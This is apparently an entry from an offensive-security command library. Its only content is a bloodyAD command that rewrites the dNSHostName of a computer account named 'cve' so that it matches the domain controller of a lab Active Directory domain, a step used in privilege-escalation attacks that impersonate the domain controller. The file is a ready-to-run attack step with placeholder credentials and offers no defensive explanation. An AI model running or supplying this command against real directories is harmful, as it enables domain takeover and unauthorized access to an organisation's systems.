---
id: 08aebb15-d40c-4f97-87cf-ef1fefce71ff
name: Set dNSHostName attribute for computer object 'cve'
type: command
executor: bash
data: python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10
  setAttribute 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName '["DC.lab.local"]'
output: null
created_at: '2023-04-06T03:56:06.137307+00:00'
updated_at: '2023-04-10T20:36:10.281363+00:00'
---

# Set dNSHostName attribute for computer object 'cve'

```bash
python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 setAttribute 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName '["DC.lab.local"]'
```
